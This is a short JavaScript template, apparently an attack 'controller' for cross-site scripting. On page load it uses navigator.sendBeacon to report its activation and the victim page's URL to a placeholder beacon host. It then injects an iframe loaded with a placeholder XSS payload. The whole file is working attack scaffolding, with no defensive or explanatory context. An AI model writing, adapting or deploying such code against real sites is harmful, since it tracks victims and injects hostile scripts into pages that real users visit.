(async () => {
    const beacon = "{{BEACON_PLACEHOLDER}}";

    console.log("controller activated");
    async function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    window.addEventListener("DOMContentLoaded", async () => {
        navigator.sendBeacon(beacon, "controller activated");
        navigator.sendBeacon(beacon, window.location.href);
        const xssSource = `{{XSS_PLACEHOLDER}}`;
        const xssIframe = document.createElement("iframe");
        xssIframe.src = xssSource;
        document.body.appendChild(xssIframe);
    });
})();